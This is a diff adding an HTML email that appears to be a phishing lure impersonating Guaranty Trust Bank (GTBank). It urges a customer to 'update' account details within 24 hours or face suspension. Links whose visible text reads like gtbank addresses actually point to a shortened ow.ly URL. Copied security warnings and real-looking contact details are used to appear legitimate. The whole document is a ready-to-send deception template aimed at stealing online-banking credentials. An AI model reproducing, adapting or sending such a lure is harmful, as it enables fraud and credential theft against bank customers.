@@ -1,0 +1,93 @@
+﻿<style type="text/css">
+#yui_3_16_0_1_1410733182060_ #yui_3_16_0_1_1410733182060_2 #yui_3_16_0_1_1410733182060_4152 #yui_3_16_0_1_1410733182060_4151 #yui_3_16_0_1_1410733182060_4150 #yui_3_16_0_1_1410733182060_4149 #yui_3_16_0_1_1410733182060_4177 #yui_3_16_0_1_1410733182060_4176 br {
+	color: #CCC;
+}
+#yui_3_16_0_1_1410733182060_ #yui_3_16_0_1_1410733182060_2 #yui_3_16_0_1_1410733182060_4152 #yui_3_16_0_1_1410733182060_4151 #yui_3_16_0_1_1410733182060_4150 #yui_3_16_0_1_1410733182060_4149 #yui_3_16_0_1_1410733182060_4177 #yui_3_16_0_1_1410733182060_4176 {
+	color: #666;
+}
+#yui_3_16_0_1_1410733182060_ #yui_3_16_0_1_1410733182060_2 #yui_3_16_0_1_1410733182060_4152 #yui_3_16_0_1_1410733182060_4151 #yui_3_16_0_1_1410733182060_4150 #yui_3_16_0_1_1410733182060_4149 #yui_3_16_0_1_1410733182060_4148 #yui_3_16_0_1_1410733182060_4147 {
+	color: #666;
+}
+#yui_3_16_0_1_1410733182060_ #yui_3_16_0_1_1410733182060_2 #yui_3_16_0_1_1410733182060_4152 #yui_3_16_0_1_1410733182060_4151 #yui_3_16_0_1_1410733182060_4150 #yui_3_16_0_1_1410733182060_4149 #yui_3_16_0_1_1410733182060_4155 #yui_3_16_0_1_1410733182060_4154 #yui_3_16_0_1_1410733182060_4157 {
+	color: #666;
+}
+#yui_3_16_0_1_1410733182060_ #yui_3_16_0_1_1410733182060_2 #yui_3_16_0_1_1410733182060_4163 #yui_3_16_0_1_1410733182060_4162 {
+	color: #666;
+}
+.n {
+	color: #666;
+}
+.n {
+	color: #666;
+}
+.style1 {color: #FF3300}
+</style>
+</head>
+
+<body>
+<table id="yui_3_16_0_1_1410733182060_3972" border="0" width="689" cellpadding="0" cellspacing="0">
+  <tbody id="yui_3_16_0_1_1410733182060_3971">
+    <tr id="yui_3_16_0_1_1410733182060_4088">
+      <td id="yui_3_16_0_1_1410733182060_4087" colspan="10"><p><img src="http://gtbank.com/images/gens/pc_250x75.png" width="250" height="75" /></p>
+      <p>Dear customer</p></td>
+    </tr>
+    <tr>
+      <td colspan="10"></td>
+    </tr>
+    <tr id="yui_3_16_0_1_1410733182060_4091">
+      <td id="yui_3_16_0_1_1410733182060_4090" colspan="10"><u id="yui_3_16_0_1_1410733182060_4094">
+        <h4 id="yui_3_16_0_1_1410733182060_4093">Guaranty Trust Bank eLectronic Notification Service (GeNS)</h4>
+      </u></td>
+    </tr>
+    <tr>
+      <td colspan="10"></td>
+    </tr>
+    <tr id="yui_3_16_0_1_1410733182060_4105">
+      <td id="yui_3_16_0_1_1410733182060_4104" colspan="10">We wish to inform <span class="yiv7697472251Apple-converted-space"> </span>you that your account with us is due for an update.</td>
+    </tr>
+    <tr id="yui_3_16_0_1_1410733182060_4110">
+      <td id="yui_3_16_0_1_1410733182060_4109" colspan="10">  </td>
+    </tr>
+    <tr id="yui_3_16_0_1_1410733182060_4113">
+      <td id="yui_3_16_0_1_1410733182060_4112" colspan="10"> Kindly login and update your details: </td>
+    </tr>
+  </tbody>
+</table>
+<br>
+<a href="http://ow.ly/IIit307kmf8"><font color="#FF3300">https:/www.gtbank/ibank3/customer-update/</font></a><br />
+<br />
+Please update within 24 Hours of notice to avoid Service Interuption/Suspension.<br><br><br>
+<table id="yui_3_16_0_1_1410733182060_" border="0" width="689" cellpadding="0" cellspacing="0">
+  <tbody id="yui_3_16_0_1_1410733182060_2">
+    <tr id="yui_3_16_0_1_1410733182060_4163">
+      <td id="yui_3_16_0_1_1410733182060_4162" colspan="10">Thank you for choosing Guaranty        Trust Bank plc</td>
+    </tr>
+    <tr id="yui_3_16_0_1_1410733182060_4160">
+      <td id="yui_3_16_0_1_1410733182060_4159" colspan="10"> </td>
+    </tr>
+    <tr id="yui_3_16_0_1_1410733182060_4152">
+      <td id="yui_3_16_0_1_1410733182060_4151" colspan="10" height="19"><table id="yui_3_16_0_1_1410733182060_4150" border="0" width="100%">
+        <tbody id="yui_3_16_0_1_1410733182060_4149">
+          <tr id="yui_3_16_0_1_1410733182060_4155">
+            <td rowspan="3" width="185"><img src="http://gtbank.com/images/gens/animated_ad.gif" alt="alert" width="185" height="260" /></td>
+            <td id="yui_3_16_0_1_1410733182060_4173" rowspan="3" width="10"> </td>
+            <td id="yui_3_16_0_1_1410733182060_4154" height="4%" width="454"><p id="yui_3_16_0_1_1410733182060_4157">"Your Internet Banking user ID and password, ATM card number and PIN are confidential and should never be disclosed to anyone".<br />
+            </p></td>
+          </tr>
+          <tr id="yui_3_16_0_1_1410733182060_4148">
+            <td id="yui_3_16_0_1_1410733182060_4147" height="10">Kindly log on to our website <a rel="nofollow" target="_blank" href="http://ow.ly/IIit307kmf8"><font color="#FF3300">www.gtbank.com</font></a> OR <br />
+              Call GTConnect on 0700 GTConnect (0809 7393494), 01 328 0000,  for more information.</td>
+          </tr>
+          <tr id="yui_3_16_0_1_1410733182060_4177">
+            <td id="yui_3_16_0_1_1410733182060_4176" height="40%" valign="top"><strong>NB:</strong><br />
+              Our notification service sent this mail to you using a   default setting and the information you supplied to us when your account   was opened.<br />
+              If you wish to Iimit the type of mails you receive or   the email address(es) in use, please send an email to us by clicking on   the link below:<br />
+              <a href="mailto:alphateam@gtbank.com" target="_blank" class="style1" id="yui_3_16_0_1_1410733182060_4179" rel="nofollow" ymailto="mailto:alphateam@gtbank.com">Send a Mail to Guaranty Trust Bank eLectronic Notification Service (GeNS)</a></td>
+          </tr>
+        </tbody>
+      </table></td>
+    </tr>
+  </tbody>
+</table>
+</body>
+</html>                                                                  
